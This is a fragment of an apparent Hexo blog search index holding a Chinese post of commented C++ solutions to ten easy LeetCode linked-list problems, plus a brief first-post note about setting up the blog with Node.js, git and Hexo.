    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LeetCode 链表 Easy</title>
    <link href="/2021/07/13/%E9%93%BE%E8%A1%A8/"/>
    <url>/2021/07/13/%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h3 id="leetcode-链表easy"><a href="#leetcode-链表easy" class="headerlink" title="leetcode 链表easy"></a>leetcode 链表easy</h3><h4 id="1反转链表"><a href="#1反转链表" class="headerlink" title="1反转链表"></a>1反转链表</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>    ListNode* p = head;<br>    ListNode* q = <span class="hljs-literal">nullptr</span>;<br>    ListNode* temp = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-keyword">while</span>(p)&#123; <br>      temp = p-&gt;next;<span class="hljs-comment">//记录头结点</span><br>      p-&gt;next = q;<span class="hljs-comment">//开始反转</span><br>      q = p;<span class="hljs-comment">//逐渐后移</span><br>      p = temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> q;<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="2两数相加-两个数字以链表的形式表示，逆序存放"><a href="#2两数相加-两个数字以链表的形式表示，逆序存放" class="headerlink" title="2两数相加(两个数字以链表的形式表示，逆序存放)"></a>2两数相加(两个数字以链表的形式表示，逆序存放)</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">addTwoNumbers</span><span class="hljs-params">(ListNode* l1, ListNode* l2)</span> </span>&#123;<br>        ListNode* head = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//建一个头结点</span><br>        ListNode* h = head;<span class="hljs-comment">//保存头结点（很多题都要保存头结点，记得注意）</span><br>        <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<span class="hljs-comment">//同位置之和</span><br>        <span class="hljs-type">bool</span> carry = <span class="hljs-literal">false</span>;<span class="hljs-comment">//判断是否要进位</span><br>        <span class="hljs-keyword">while</span>(l1 || l2)&#123;<span class="hljs-comment">//当两个链表有一个不为空时</span><br>            sum = <span class="hljs-number">0</span>; <span class="hljs-comment">//每次循环都要重置sum</span><br>            <span class="hljs-keyword">if</span>(l1)&#123; <br>                sum += l1-&gt;val;<br>                l1 = l1-&gt;next;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(l2)&#123; <br>                sum += l2-&gt;val;<br>                l2 = l2-&gt;next;<br>            &#125;<span class="hljs-comment">//分别把两个链表相对位置的数相加</span><br>            <span class="hljs-keyword">if</span>(carry)&#123; <span class="hljs-comment">//判断上次两数之和是否需要进位</span><br>                sum++;<br>            &#125;<br>            h-&gt;next = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(sum % <span class="hljs-number">10</span>);<span class="hljs-comment">//建立新的结点，值为模10之和的数</span><br>            h = h-&gt;next;<br>            <span class="hljs-keyword">if</span>(sum &gt; <span class="hljs-number">10</span> || sum == <span class="hljs-number">10</span>)&#123; <span class="hljs-comment">//进位的判断</span><br>                carry = <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123; <br>                carry = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(carry)&#123; <span class="hljs-comment">//当两个链表都遍历结束之和，可能还需要最后一次进位</span><br>            h-&gt;next = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> head-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="3合并两个升序链表"><a href="#3合并两个升序链表" class="headerlink" title="3合并两个升序链表"></a>3合并两个升序链表</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode* l1, ListNode* l2)</span> </span>&#123;<br>        ListNode* head = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">0</span>);<br>        ListNode* head1 = head;<span class="hljs-comment">//老样子，新建两个结点，保留一个，对另一个操作</span><br>        <span class="hljs-keyword">while</span>(l1 &amp;&amp; l2)&#123; <span class="hljs-comment">//两个链表都没到结尾时</span><br>            <span class="hljs-keyword">if</span>(l1-&gt;val &lt; l2-&gt;val)&#123; <br>                head1-&gt;next = l1;<br>                l1 = l1-&gt;next;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123; <br>                head1-&gt;next = l2;<br>                l2 = l2-&gt;next;<br>            &#125;<br>            head1 = head1-&gt;next;<span class="hljs-comment">//头结点也要记得往后移动</span><br>        &#125;<br>            <span class="hljs-keyword">if</span>(!l1)&#123; <span class="hljs-comment">//如果其中一个链表空了，结点只需要指向另外一个即可</span><br>                head1-&gt;next = l2;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!l2)&#123; <br>                head1-&gt;next = l1;<br>            &#125;<br>        <span class="hljs-keyword">return</span> head-&gt;next;<span class="hljs-comment">//返回头结点的下一个</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="4删除升序链表中的重复结点"><a href="#4删除升序链表中的重复结点" class="headerlink" title="4删除升序链表中的重复结点"></a>4删除升序链表中的重复结点</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">deleteDuplicates</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>         <span class="hljs-keyword">if</span>(!head)&#123; <span class="hljs-comment">//安全起见，先判空</span><br>            <span class="hljs-keyword">return</span> head;<br>         &#125;<br>        ListNode* p = head;<span class="hljs-comment">//用新的头结点对链表操作</span><br>        <span class="hljs-keyword">while</span>(p-&gt;next)&#123; <br>            <span class="hljs-keyword">if</span>(p-&gt;val == p-&gt;next-&gt;val)&#123; <br>                p-&gt;next = p-&gt;next-&gt;next;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123; <br>                p = p-&gt;next;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<span class="hljs-comment">//本题没有释放被删除结点的空间。</span><br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="释放被删除结点的空间的解法"><a href="#释放被删除结点的空间的解法" class="headerlink" title="释放被删除结点的空间的解法"></a>释放被删除结点的空间的解法</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">deleteDuplicates</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>         <span class="hljs-keyword">if</span>(!head || !head-&gt;next)&#123;<span class="hljs-comment">//判断是否为空 </span><br>            <span class="hljs-keyword">return</span> head;<br>         &#125;<br>        ListNode* fastptr = head-&gt;next;<br>        ListNode* slowptr = head;<span class="hljs-comment">//利用快慢指针来释放被删除结点的空间</span><br>        <span class="hljs-keyword">while</span>(fastptr-&gt;next)&#123; <br>            <span class="hljs-keyword">if</span>(slowptr-&gt;val == fastptr-&gt; val)&#123; <br>                ListNode* temp = slowptr-&gt;next;<br>                slowptr-&gt;next = fastptr-&gt;next;<br>                fastptr = fastptr-&gt;next;<span class="hljs-comment">//因为重复的结点被删除了，所以需要快指针需要向前走一个</span><br>                <span class="hljs-keyword">delete</span> temp;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            slowptr = slowptr-&gt;next;<br>            fastptr = fastptr-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(slowptr-&gt;val == fastptr-&gt;val)&#123; <span class="hljs-comment">//如果最后两个结点相同</span><br>            <span class="hljs-keyword">delete</span> fastptr;<span class="hljs-comment">//删除快结点，同时改变指针指向</span><br>            slowptr-&gt;next = <span class="hljs-literal">nullptr</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="5是否有环形链表"><a href="#5是否有环形链表" class="headerlink" title="5是否有环形链表"></a>5是否有环形链表</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasCycle</span><span class="hljs-params">(ListNode *head)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(head == <span class="hljs-literal">nullptr</span> || head-&gt;next == <span class="hljs-literal">nullptr</span>)&#123; <span class="hljs-comment">//先做一步判断</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        ListNode* fast_ptr = head;<br>        ListNode* slow_ptr = head;<span class="hljs-comment">//快慢指针</span><br>        <span class="hljs-keyword">while</span>(fast_ptr &amp;&amp; fast_ptr-&gt;next)&#123; <span class="hljs-comment">//在没有环的情况下用来判断有没有到链表的尾部。</span><br>            slow_ptr = slow_ptr-&gt;next;<br>            fast_ptr = fast_ptr-&gt;next-&gt;next;<br>            <span class="hljs-keyword">if</span>(slow_ptr == fast_ptr)&#123; <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="6判断链表是否相交"><a href="#6判断链表是否相交" class="headerlink" title="6判断链表是否相交"></a>6判断链表是否相交</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode *<span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode *headA, ListNode *headB)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(headA == <span class="hljs-literal">NULL</span> || headB == <span class="hljs-literal">NULL</span>)&#123; <span class="hljs-comment">//有一个为空就不可能相交</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        ListNode* p = headA;<br>        ListNode* q = headB;<br>        <span class="hljs-keyword">while</span>(p != q)&#123;<span class="hljs-comment">//在相交的前提下，找焦点的方法就是当一个链表遍历完了之后，让其指向另外一个链表的头结点再遍历</span><br>            <span class="hljs-keyword">if</span>(p)&#123; <span class="hljs-comment">//如果相交的话，总过路程相等的情况下一定会有一个交点。如果不相交，遍历完之后只能返回空结点。</span><br>                p = p-&gt;next;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                p = headB;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(q)&#123;<br>                q = q-&gt;next;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123; <br>                q = headA;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="7移除链表元素"><a href="#7移除链表元素" class="headerlink" title="7移除链表元素"></a>7移除链表元素</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">removeElements</span><span class="hljs-params">(ListNode* head, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-keyword">while</span>(head != <span class="hljs-literal">nullptr</span> &amp;&amp; head-&gt;val == val)<span class="hljs-comment">//注意是while不是if</span><br>        &#123;<br>            ListNode* temp = head;<br>            head = head -&gt;next;<br>            <span class="hljs-keyword">delete</span> temp;<br>        &#125; <br>        ListNode* q = head;<br>        <span class="hljs-keyword">while</span>(q != <span class="hljs-literal">nullptr</span> &amp;&amp; q-&gt;next != <span class="hljs-literal">nullptr</span>)<br>        &#123; <br>            <span class="hljs-keyword">if</span>(q-&gt;next-&gt;val == val)&#123; <br>                ListNode* temp = q-&gt;next;<br>                q-&gt;next = q-&gt;next-&gt;next;<br>                <span class="hljs-keyword">delete</span> temp;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123; <br>                q=q-&gt;next;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="8判断是否是回文链表"><a href="#8判断是否是回文链表" class="headerlink" title="8判断是否是回文链表"></a>8判断是否是回文链表</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPalindrome</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* slow_ptr = head;<br>        ListNode* fast_ptr = head;<br>        <span class="hljs-keyword">while</span>(fast_ptr &amp;&amp; fast_ptr-&gt;next)&#123; <br>            slow_ptr = slow_ptr-&gt;next;<br>            fast_ptr = fast_ptr-&gt;next-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(fast_ptr != <span class="hljs-literal">nullptr</span>)&#123; <span class="hljs-comment">//这种是奇数的情况 满指针需要再向前走一个结点</span><br>            slow_ptr = slow_ptr-&gt;next;<br>        &#125;<span class="hljs-comment">//用来判断结点数量是奇数还是偶数</span><br>        slow_ptr = <span class="hljs-built_in">reverse</span>(slow_ptr);<span class="hljs-comment">//反转后半部分的链表</span><br>        <span class="hljs-keyword">while</span>(slow_ptr)&#123; <br>            <span class="hljs-keyword">if</span> (head-&gt;val != slow_ptr-&gt;val)&#123; <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123; <br>                head = head-&gt;next;<br>                slow_ptr = slow_ptr-&gt;next;<br>            &#125;<br>        &#125; <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-function">ListNode *<span class="hljs-title">reverse</span><span class="hljs-params">(ListNode* head)</span></span>&#123;<br>        ListNode* p = head;<br>        ListNode* q = <span class="hljs-literal">nullptr</span>;<br>        ListNode* temp = <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">while</span>(p)&#123; <br>            temp = p-&gt;next;<br>            p-&gt;next = q;<br>            q = p;<br>            p = temp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> q;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="9删除结点"><a href="#9删除结点" class="headerlink" title="9删除结点"></a>9删除结点</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">deleteNode</span><span class="hljs-params">(ListNode* node)</span> </span>&#123;<br>        node-&gt;val = node-&gt;next-&gt;val;<br>        node-&gt;next = node-&gt;next-&gt;next;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="10链表的中间结点"><a href="#10链表的中间结点" class="headerlink" title="10链表的中间结点"></a>10链表的中间结点</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">middleNode</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* fast_ptr = head;<br>        ListNode* slow_ptr = head;<br>        <span class="hljs-keyword">while</span>(fast_ptr &amp;&amp; fast_ptr-&gt;next)&#123; <br>            fast_ptr = fast_ptr-&gt;next-&gt;next;<br>            slow_ptr = slow_ptr-&gt;next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> slow_ptr;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FirstBlog</title>
    <link href="/2021/07/13/index/"/>
    <url>/2021/07/13/index/</url>
    
    <content type="html"><![CDATA[<p>花了两天时间，搭建的第一个自己的博客，用Nodejs+git+hexo完成的，过程非常不容易。</p><p><del>网上的教程过于稀碎</del>，其实是我过于垃圾，才花了两天。可能以后会在这里分享一些自己的想法以及一些学习上的笔记。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
